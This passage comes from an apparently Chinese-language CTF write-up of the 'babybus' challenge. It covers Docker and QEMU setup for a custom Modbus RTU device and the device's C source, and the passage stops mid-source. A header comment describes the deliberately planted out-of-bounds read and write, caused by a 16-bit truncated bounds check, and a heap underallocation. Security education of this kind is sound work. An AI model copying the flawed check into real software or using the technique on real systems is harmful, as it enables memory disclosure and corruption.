class="variable">$&#123;PORT&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$&#123;TIMER_RESTART&#125;</span>&quot;</span> -gt 0 ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;[entrypoint] timer restart enabled: <span class="variable">$&#123;TIMER_RESTART&#125;</span>s&quot;</span></span><br><span class="line">    <span class="built_in">set</span> +e</span><br><span class="line">    <span class="built_in">timeout</span> <span class="string">&quot;<span class="variable">$&#123;TIMER_RESTART&#125;</span>&quot;</span> <span class="string">&quot;<span class="variable">$&#123;GEN_RUN&#125;</span>&quot;</span></span><br><span class="line">    exit_code=$?</span><br><span class="line">    <span class="built_in">set</span> -e</span><br><span class="line"></span><br><span class="line">    current_time=$(<span class="built_in">date</span> +%s)</span><br><span class="line">    runtime=$((current_time - start_time))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> [ <span class="variable">$exit_code</span> -eq 124 ]; <span class="keyword">then</span></span><br><span class="line">      <span class="comment"># timeout命令的退出码124表示超时</span></span><br><span class="line">      <span class="built_in">echo</span> <span class="string">&quot;[entrypoint] qemu timed out after <span class="variable">$&#123;TIMER_RESTART&#125;</span>s (runtime: <span class="variable">$&#123;runtime&#125;</span>s), restarting&quot;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">echo</span> <span class="string">&quot;[entrypoint] qemu exited with code <span class="variable">$&#123;exit_code&#125;</span> after <span class="variable">$&#123;runtime&#125;</span>s, restart in <span class="variable">$&#123;RESTART_DELAY&#125;</span>s&quot;</span></span><br><span class="line">      <span class="built_in">sleep</span> <span class="string">&quot;<span class="variable">$&#123;RESTART_DELAY&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="comment"># 仅错误重启模式</span></span><br><span class="line">    <span class="built_in">set</span> +e</span><br><span class="line">    <span class="string">&quot;<span class="variable">$&#123;GEN_RUN&#125;</span>&quot;</span></span><br><span class="line">    exit_code=$?</span><br><span class="line">    <span class="built_in">set</span> -e</span><br><span class="line"></span><br><span class="line">    current_time=$(<span class="built_in">date</span> +%s)</span><br><span class="line">    runtime=$((current_time - start_time))</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;[entrypoint] qemu exited with code <span class="variable">$&#123;exit_code&#125;</span> after <span class="variable">$&#123;runtime&#125;</span>s, restart in <span class="variable">$&#123;RESTART_DELAY&#125;</span>s&quot;</span></span><br><span class="line">    <span class="built_in">sleep</span> <span class="string">&quot;<span class="variable">$&#123;RESTART_DELAY&#125;</span>&quot;</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># 重置开始时间</span></span><br><span class="line">  start_time=$(<span class="built_in">date</span> +%s)</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure></div>

<p>构建 Docker 镜像：</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -t babybus .</span><br></pre></td></tr></table></figure></div>

<p>之后启动容器：</p>
<ul>
<li><p>普通模式（仍然是 20 秒重启逻辑）</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker run --<span class="built_in">rm</span> -it \</span><br><span class="line">  --name babybus \</span><br><span class="line">  -e ICQ_FLAG=flag&#123;fake_flag&#125; \</span><br><span class="line">  -p 1502:1502 \</span><br><span class="line">  babybus</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>调试模式（不受 20 秒限制，gdbserver&#x3D;2345）</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">docker run --<span class="built_in">rm</span> -it \</span><br><span class="line">  --name babybus \</span><br><span class="line">  -e ICQ_FLAG=flag&#123;fake_flag&#125; \</span><br><span class="line">  -e DEBUG_SERVER=1 \</span><br><span class="line">  -p 1502:1502 -p 2345:2345 \</span><br><span class="line">  --cap-add=SYS_PTRACE \</span><br><span class="line">  --security-opt seccomp=unconfined \</span><br><span class="line">  babybus</span><br></pre></td></tr></table></figure></div></li>
</ul>
<p>方便起见调试时可以采用如下命令循环启动：</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="literal">true</span>; <span class="keyword">do</span></span><br><span class="line">  docker run --<span class="built_in">rm</span> -it \</span><br><span class="line">    --name babybus \</span><br><span class="line">    -e ICQ_FLAG=flag&#123;fake_flag&#125; \</span><br><span class="line">    -e DEBUG_SERVER=1 \</span><br><span class="line">    -p 1502:1502 -p 2345:2345 \</span><br><span class="line">    --cap-add=SYS_PTRACE \</span><br><span class="line">    --security-opt seccomp=unconfined \</span><br><span class="line">    babybus</span><br><span class="line">  code=$?</span><br><span class="line">  <span class="comment"># 130/143 通常是你 Ctrl+C/TERM 主动打断，别再重启</span></span><br><span class="line">  <span class="keyword">if</span> [[ <span class="variable">$code</span> -eq 130 || <span class="variable">$code</span> -eq 143 ]]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;收到中断，退出循环。&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 0</span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;容器退出，状态码 <span class="variable">$code</span>，2 秒后重启…（Ctrl+C 终止）&quot;</span></span><br><span class="line">  <span class="built_in">sleep</span> 2</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure></div>

<h2 id="漏洞分析-7"><a href="#漏洞分析-7" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>题目是一个实现了 <strong>Modbus RTU 协议</strong>交互的 QEMU 字符设备。</p>
<p>启动后，QEMU 不跑任何 CPU&#x2F;系统镜像（<code>-machine none -nodefaults</code>），只注册并运行了一个自定义外设：<code>modbus-rtu</code>。它通过 QEMU 的 <code>chardev socket</code> 把这个外设挂到一个 <strong>TCP 端口（默认 1502）</strong> 上：</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">./qemu-system-x86_64 \</span><br><span class="line">-machine none \</span><br><span class="line">-nographic \</span><br><span class="line">-nodefaults \</span><br><span class="line">-chardev socket,<span class="built_in">id</span>=mbus,host=0.0.0.0,port=1502,server=on,<span class="built_in">wait</span>=off \</span><br><span class="line">-device modbus-rtu,chardev=mbus,unit-id=1</span><br></pre></td></tr></table></figure></div>

<ul>
<li><code>-machine none</code>：没有虚拟机、没有 guest，只是一个设备在跑。</li>
<li><code>-chardev socket,server=on,host=0.0.0.0,port=1502</code>：QEMU 开启 TCP 服务，监听 1502 端口，<code>id</code> 为 <code>mbus</code>。</li>
<li><code>-device modbus-rtu,chardev=mbus,unit-id=1</code>：注册了一个 Modbus RTU 从站设备，从站地址（unit-id）为 1。并且设置 <code>CharBackend</code> 为前面定义的 <code>mbus</code>。</li>
</ul>
<blockquote>
<p><strong>“监听网络端口”这件事根本不在设备代码里实现</strong>，而是在 <strong>QEMU 的 chardev 后端层</strong> 做的。你的设备代码只和一个“字符流”打交道，至于这个字符流是来自 TCP 端口、UNIX 套接字、PTY、管道还是 stdio，都由 <code>-chardev</code> 的<strong>后端类型</strong>决定。</p>
<ul>
<li><strong>设备前端（FE）</strong>：你的 <code>ModbusRtuState</code> 里有一个 <code>CharBackend chr;</code>，并在 <code>realize()</code> 里调用：<ul>
<li><code>qemu_chr_fe_set_handlers(&amp;s-&gt;chr, ...)</code> 注册回调（能读多少、收到数据、opened 事件）。</li>
<li><code>qemu_chr_fe_write_all(&amp;s-&gt;chr, ...)</code> 发数据。</li>
</ul>
</li>
<li><strong>后端（BE）</strong>：由命令行 <code>-chardev ... ,id=XXX</code> 创建，比如 <code>socket</code>、<code>pty</code>、<code>pipe</code>、<code>file</code>、<code>stdio</code> 等等。不同后端负责<strong>实际的 I&#x2F;O</strong>：<ul>
<li><code>-chardev socket,...,server=on,host=...,port=...</code> → <strong>监听 TCP 端口</strong>；</li>
<li><code>-chardev socket,...,path=/tmp/mbus.sock,server=on</code> → <strong>监听 UNIX 域套接字</strong>；</li>
<li><code>-chardev pty,id=...</code> → <strong>创建一个伪终端</strong>；</li>
<li><code>-chardev stdio,id=...</code> → <strong>走 QEMU 的标准输入输出</strong>；</li>
<li>……</li>
</ul>
</li>
</ul>
<p>然后你在设备上把两者<strong>绑定</strong>起来：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-device modbus-rtu,chardev=XXX,unit-id=1</span><br></pre></td></tr></table></figure></div>

<p>设备只知道有个 <code>CharBackend</code> 叫 <code>XXX</code>，背后具体是不是网络端口，它不关心。</p>
</blockquote>
<p>题目完整代码如下：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: GPL-2.0-or-later</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * QEMU Modbus RTU character-device helper</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 一个挂在 -chardev 后端上的简单 Modbus RTU 从站(slave)。</span></span><br><span class="line"><span class="comment"> * 仅实现功能码 0x03（读保持寄存器）与 0x10（写多个保持寄存器）。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 行为特意保持与用户给出的反编译片段一致（CTF 还原）：</span></span><br><span class="line"><span class="comment"> *  - 输入缓冲区大小 260 字节；can_read() 返回 260 - rx_len</span></span><br><span class="line"><span class="comment"> *  - 帧长判定：fc=0x03 =&gt; 固定 8 字节；fc=0x10 =&gt; 9 + bytecount</span></span><br><span class="line"><span class="comment"> *  - 校验 CRC16（Modbus 多项式 0xA001，初值 0xFFFF，低位在前），</span></span><br><span class="line"><span class="comment"> *    若 CRC 不匹配，则丢弃 1 个字节并重试</span></span><br><span class="line"><span class="comment"> *  - 当收到未知功能码且缓冲区已有 ≥4 字节时，发送异常应答</span></span><br><span class="line"><span class="comment"> *    (ILLEGAL FUNCTION=0x01)，随后只丢 1 个字节（地址），再重试</span></span><br><span class="line"><span class="comment"> *  - 仅当单元 ID 匹配或广播地址(0x00)时才处理请求</span></span><br><span class="line"><span class="comment"> *  - 广播按照给定逻辑同样会发送“响应”（与标准不同，保持题面一致）</span></span><br><span class="line"><span class="comment"> *  - 地址范围：0..255（16 位寄存器），共 256 个保持寄存器</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * -------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"> * 【关键漏洞说明】</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 1) 越界读（0x03）</span></span><br><span class="line"><span class="comment"> *    - 原因：合法性校验采用 (uint16_t)(start + count) ≤ 0x100（16 位截断“环回”），</span></span><br><span class="line"><span class="comment"> *            但实际读取使用 regs[start + i]（按真实 start 做索引，不截断）。</span></span><br><span class="line"><span class="comment"> *    - 只要选择“很大的 start（如接近 0xFFFF）+ 小的 count”，使 16 位环回后</span></span><br><span class="line"><span class="comment"> *      条件满足，即可从 regs 数组“之后”的内存读取数据并打包返回。</span></span><br><span class="line"><span class="comment"> *    - 单帧稳定泄露建议：count ≤ 127（避免下述少分配溢出），可泄露 2*count 字节，</span></span><br><span class="line"><span class="comment"> *      最大 254 字节/帧。读地址范围（相对 regs 基址 B）为 [B + 2*start, B + 2*(start+count-1)]。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 2) 越界写（0x10）</span></span><br><span class="line"><span class="comment"> *    - 原因：同样的 16 位截断校验 (uint16_t)(start + count) ≤ 0x100，实际写入</span></span><br><span class="line"><span class="comment"> *      使用 regs[start + i]。选择“很大的 start + 小的 count”，即可把请求体中的</span></span><br><span class="line"><span class="comment"> *      数据写到 regs 数组外部（覆盖其它对象/指针等）。</span></span><br><span class="line"><span class="comment"> *    - 受接收缓冲 260 字节限制：0x10 的总帧长 = 9 + byte_count ≤ 260，且 byte_count=2*count，</span></span><br><span class="line"><span class="comment"> *      故 count ≤ 125。单帧最大可写 2*count = 250 字节。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 3) 额外但不在本题主线的风险（保留于注释提醒）：</span></span><br><span class="line"><span class="comment"> *    - 0x03 路径中 byte_count=2*count 使用 uint8_t 截断，count≥128 时会“少分配”导致堆溢出。</span></span><br><span class="line"><span class="comment"> *      本文件仅注释“越界读写”要点，堆溢出细节见题解文档。</span></span><br><span class="line"><span class="comment"> * -------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;qemu/osdep.h&quot;</span>          <span class="comment">// QEMU 通用平台依赖封装</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;qapi/error.h&quot;</span>          <span class="comment">// 错误处理/报告</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;hw/qdev-core.h&quot;</span>        <span class="comment">// QOM/QDev 框架核心</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;qemu/module.h&quot;</span>         <span class="comment">// 模块注册(type_init等)</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;chardev/char-fe.h&quot;</span>     <span class="comment">// 字符设备前端封装</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;hw/qdev-properties.h&quot;</span>  <span class="comment">// 设备属性注册/宏</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;qemu/bswap.h&quot;</span>          <span class="comment">// 大小端工具（此处手写了be16_load/store）</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;qemu/log.h&quot;</span>            <span class="comment">// 日志（此实现未使用）</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TYPE_MODBUS_RTU <span class="string">&quot;modbus-rtu&quot;</span></span></span><br><span class="line">OBJECT_DECLARE_SIMPLE_TYPE(ModbusRtuState, MODBUS_RTU)</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ---- Modbus 协议常量 --------------------------------------------------- */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">    MODBUS_FC_READ_HOLDING   = <span class="number">0x03</span>, <span class="comment">// 读保持寄存器</span></span><br><span class="line">    MODBUS_FC_WRITE_MULTIPLE = <span class="number">0x10</span>, <span class="comment">// 写多个保持寄存器</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">    MODBUS_EX_ILLEGAL_FUNCTION   = <span class="number">0x01</span>, <span class="comment">// 功能码不支持</span></span><br><span class="line">    MODBUS_EX_ILLEGAL_DATA_ADDR  = <span class="number">0x02</span>, <span class="comment">// 非法地址</span></span><br><span class="line">    MODBUS_EX_ILLEGAL_DATA_VALUE = <span class="number">0x03</span>, <span class="comment">// 非法数据值/长度</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ---- 设备状态 ---------------------------------------------------------- */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">ModbusRtuState</span> &#123;</span></span><br><span class="line">    DeviceState parent_obj;   <span class="comment">// 继承 QEMU DeviceState（QOM 对象基类）</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* chardev 前端（与 -chardev 后端连接的前端句柄） */</span></span><br><span class="line">    CharBackend chr;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 可配置属性 */</span></span><br><span class="line">    <span class="type">uint8_t</span> unit_id;          <span class="comment">/* &quot;unit-id&quot;：Modbus 从站地址 */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 内部保持寄存器区：256 × 16 位（0..255） */</span></span><br><span class="line">    <span class="type">uint16_t</span> regs[<span class="number">256</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 接收累积缓冲（反编译片段使用 260 字节，这里保持一致） */</span></span><br><span class="line">    <span class="type">uint8_t</span>  rx_buf[<span class="number">260</span>];</span><br><span class="line">    <span class="type">size_t</span>   rx_len;          <span class="comment">// 当前已累积的字节数</span></span><br><span class="line">&#125; ModbusRtuState;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ---- 辅助函数 ---------------------------------------------------------- */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 从大端字节序读取 16 位 */</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">uint16_t</span> <span class="title function_">be16_load</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span> *p)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">uint16_t</span>)((p[<span class="number">0</span>] &lt;&lt; <span class="number">8</span>) | p[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 按大端字节序写入 16 位 */</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">be16_store</span><span class="params">(<span class="type">uint8_t</span> *p, <span class="type">uint16_t</span> v)</span></span><br><span class="line">&#123;</span><br><span class="line">    p[<span class="number">0</span>] = (<span class="type">uint8_t</span>)(v &gt;&gt; <span class="number">8</span>);</span><br><span class="line">    p[<span class="number">1</span>] = (<span class="type">uint8_t</span>)(v &amp; <span class="number">0xFF</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Modbus CRC16：多项式 0xA001，初始 0xFFFF，按 LSB-first 逐位滚动</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">uint16_t</span> <span class="title function_">modbus_crc16</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span> *buf, <span class="type">size_t</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint16_t</span> crc = <span class="number">0xFFFF</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        crc ^= buf[i];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> b = <span class="number">0</span>; b &lt; <span class="number">8</span>; b++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (crc &amp; <span class="number">0x0001</span>) &#123;</span><br><span class="line">                crc = (crc &gt;&gt; <span class="number">1</span>) ^ <span class="number">0xA001</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                crc &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> crc;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 